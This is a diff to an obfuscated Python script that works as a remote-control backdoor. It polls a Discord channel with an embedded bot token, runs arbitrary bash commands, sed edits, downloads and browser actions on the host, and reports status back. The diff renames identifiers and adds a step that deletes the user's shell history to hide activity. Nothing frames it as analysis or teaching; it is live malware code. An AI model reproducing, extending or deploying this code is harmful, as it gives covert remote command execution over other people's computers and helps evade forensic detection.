@@ -1,126 +1,127 @@
-import http.client as _Y3
-import sys as _S9
-import json as _J2
-import time as _T1
-import socket as _K5
-import random as _R4
-import subprocess as _P6
+import http.client as _H9
+import sys as _S7
+import json as _J3
+import time as _T5
+import socket as _K8
+import random as _R2
+import subprocess as _P4
 
-_TK2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
-_HDS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_TK2}'}
-_IDN = _K5.gethostname().split('.')[0]
-_RL = 0
+_RS8 = 0
+_TKN2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
+_HDRS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_TKN2}'}
+_IDN = _K8.gethostname().split('.')[0]
 
-def _SN1(_MSG):
+def _SN3(_MSG):
     _DT = {"content": _MSG}
-    _JSN = _J2.dumps(_DT)
-    _CN = _Y3.HTTPSConnection("discord.com")
+    _JSN = _J3.dumps(_DT)
+    _CN = _H9.HTTPSConnection("discord.com")
     _URL = f"/api/v10/channels/1342067836415381565/messages"
-    _CN.request("POST", _URL, body=_JSN, headers=_HDS)
+    _CN.request("POST", _URL, body=_JSN, headers=_HDRS)
     _CN.getresponse()
     _CN.close()
 
 def _EX():
     print("Exiting...")
-    _SN1(f"❌ `[{_IDN}] is deactivated`")
-    _S9.exit()
+    _SN3(f"❌ `[{_IDN}] is deactivated`")
+    _S7.exit()
 
-def _REV():
-    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
+def _RV():
+    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
 
-def _NRM():
-    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
+def _NM():
+    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
 
-def _RGT():
-    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
+def _RG():
+    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
 
-def _LFT():
-    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
+def _LF():
+    _P4.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
 
-def _NT(_R):
-    _P6.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_R}'])
+def _NT(_RS):
+    _P4.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_RS}'])
 
-def _SED(_R):
-    _RS = _R.split('?')
-    _P6.run(['sed', '-i', f'{_RS[0]}', f'{_RS[1]}'], check=True)
+def _SD(_RS):
+    _RS_SP = _RS.split('?')
+    _P4.run(['sed', '-i', f'{_RS_SP[0]}', f'{_RS_SP[1]}'], check=True)
 
-def _FFX(_R):
-    _P6.run(['firefox', '--new-tab', f'{_R}'], check=True)
+def _FF(_RS):
+    _P4.run(['firefox', '--new-tab', f'{_RS}'], check=True)
 
-def _OPN_IMG(_R):
-    _P6.run(f'curl "{_R}" -o img.jpg', shell=True, check=True)
-    _P6.run(['xdg-open', 'img.jpg'], check=True)
+def _OP_IMG(_RS):
+    _P4.run(f'curl "{_RS}" -o img.jpg', shell=True, check=True)
+    _P4.run(['xdg-open', 'img.jpg'], check=True)
 
-def _LCHR(_R):
-    match _R:
+def _LCH_PRE(_RS):
+    match _RS:
         case "exit":
             _EX()
         case "activated":
-            _SN1(f"✅ `{_IDN}-is activated`")
+            _SN3(f"✅ `{_IDN}-is activated`")
         case "inverted screen":
-            _REV()
+            _RV()
         case "normal screen":
-            _NRM()
+            _NM()
         case "right screen":
-            _RGT()
+            _RG()
         case "left screen":
-            _LFT()
+            _LF()
         case _:
             return
 
-def _LCHC(_SPL):
-    match _SPL[0]:
+def _LCH_CST(_SP_RS):
+    match _SP_RS[0]:
         case "newterm":
-            _NT(_SPL[1])
+            _NT(_SP_RS[1])
         case "sed":
-            _SED(_SPL[1])
+            _SD(_SP_RS[1])
         case "firefox":
-            _FFX(_SPL[1])
+            _FF(_SP_RS[1])
         case "openimg":
-            _OPN_IMG(_SPL[1])
+            _OP_IMG(_SP_RS[1])
         case _:
             return
 
-def _MAIN():
-    global _RL
+def _MN():
+    global _RS8
+    _P4.run(f'rm ~/.zsh_history', shell=True, check=True)
     while True:
         try:
-            _CN = _Y3.HTTPSConnection("discord.com")
+            _CN = _H9.HTTPSConnection("discord.com")
             _URL = f"/api/v10/channels/1341791654503514122/messages?limit=1"
-            _CN.request("GET", _URL, headers=_HDS)
+            _CN.request("GET", _URL, headers=_HDRS)
             _RESP = _CN.getresponse()
             _CONTENT = _RESP.read().decode("utf-8")
-            _JSN = _J2.loads(_CONTENT)
+            _JSN = _J3.loads(_CONTENT)
 
             _VAL = _JSN[0]['content']
             _VLS = _VAL.split('$')
             if len(_VLS) == 2:
                 if _VLS[0] != _IDN:
-                    _T1.sleep(1)
+                    _T5.sleep(1)
                     continue
-                if _RL != _VLS[1]:
-                    _RL = _VLS[1]
-                    _SPL = _RL.split('!')
-                    if len(_SPL) == 2:
-                        _LCHC(_SPL)
+                if _RS8 != _VLS[1]:
+                    _RS8 = _VLS[1]
+                    _SP_RS = _RS8.split('!')
+                    if len(_SP_RS) == 2:
+                        _LCH_CST(_SP_RS)
                     else:
-                        _LCHR(_RL)
+                        _LCH_PRE(_RS8)
             elif len(_VLS) == 1:
-                if _RL != _VLS[0]:
-                    _RL = _VLS[0]
-                    _SPL = _RL.split('!')
-                    if len(_SPL) == 2:
-                        _LCHC(_SPL)
+                if _RS8 != _VLS[0]:
+                    _RS8 = _VLS[0]
+                    _SP_RS = _RS8.split('!')
+                    if len(_SP_RS) == 2:
+                        _LCH_CST(_SP_RS)
                     else:
-                        _LCHR(_RL)
-            _T1.sleep(_R4.randint(1, 15))
+                        _LCH_PRE(_RS8)
+            _T5.sleep(_R2.randint(1, 15))
         except Exception as _E:
             if _E.args[0] == 0:
-                _T1.sleep(_R4.randint(5, 20))
+                _T5.sleep(_R2.randint(5, 20))
             else:
-                _SN1(f"❌ `[{_IDN}] Error: {_E}`")
-                _T1.sleep(_R4.randint(5, 20))
+                _SN3(f"❌ `[{_IDN}] Error: {_E}`")
+                _T5.sleep(_R2.randint(5, 20))
 
 if __name__ == "__main__":
-    _SN1(f"✅ `[{_IDN}] is activated`")
-    _MAIN()
+    _SN3(f"✅ `[{_IDN}] is activated`")
+    _MN()
